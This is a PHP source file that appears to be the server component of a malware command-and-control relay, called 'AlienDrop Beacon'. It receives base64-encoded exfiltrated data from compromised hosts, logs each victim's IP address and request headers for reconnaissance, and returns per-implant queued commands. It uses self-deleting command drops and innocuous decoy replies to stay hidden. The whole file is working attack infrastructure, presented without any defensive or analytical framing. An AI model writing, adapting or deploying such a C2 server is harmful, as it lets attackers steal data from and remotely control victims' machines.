<?php
// MINC - AlienDrop Beacon + Command Relay (Stealth C2 v2, Auto-Infra)

header("Content-Type: text/plain");

// Configuration
$max_cmd_len   = 4096;
$auto_unlink   = true; // One-time-use command drops
$log_headers   = true; // Log request headers for recon
$exfil_key     = 'data';
$commands_dir  = __DIR__ . '/commands';
$output_dir    = __DIR__ . '/output/beacons';

// Ensure required dirs exist
@mkdir($commands_dir, 0777, true);
@mkdir($output_dir, 0777, true);

// Validate POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST[$exfil_key])) {
    http_response_code(403);
    echo "forbidden";
    exit;
}

// Decode payload
$payload_raw = $_POST[$exfil_key];
$decoded     = base64_decode($payload_raw);
$log_data    = @json_decode($decoded, true);

// Validate decoded structure
if (!is_array($log_data) || empty($log_data['exfil_id'])) {
    echo "ok";
    exit;
}

$exfil_id = preg_replace('/[^a-z0-9]/i', '_', $log_data['exfil_id']);
$timestamp = time();
$log_file = "{$output_dir}/{$exfil_id}_{$timestamp}.json";

// Optionally log request IP/headers
if ($log_headers) {
    $log_data['_meta'] = [
        'ip'      => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'agent'   => $_SERVER['HTTP_USER_AGENT'] ?? 'none',
        'headers' => getallheaders()
    ];
}

// Write beacon log
@file_put_contents($log_file, json_encode($log_data, JSON_PRETTY_PRINT));

// Look for command payload
$cmd_path = "{$commands_dir}/{$exfil_id}.b64";
$fallback_cmd = "{$commands_dir}/default.b64";
$payload_out = "";

if (file_exists($cmd_path)) {
    $payload_out = trim(@file_get_contents($cmd_path));
    if ($auto_unlink) @unlink($cmd_path);
} elseif (file_exists($fallback_cmd)) {
    $payload_out = trim(@file_get_contents($fallback_cmd));
}

// Only send valid command responses
if (!empty($payload_out) && strlen($payload_out) <= $max_cmd_len) {
    echo $payload_out;
    exit;
}

// Default response (stealth)
echo "ok";
exit;
?>

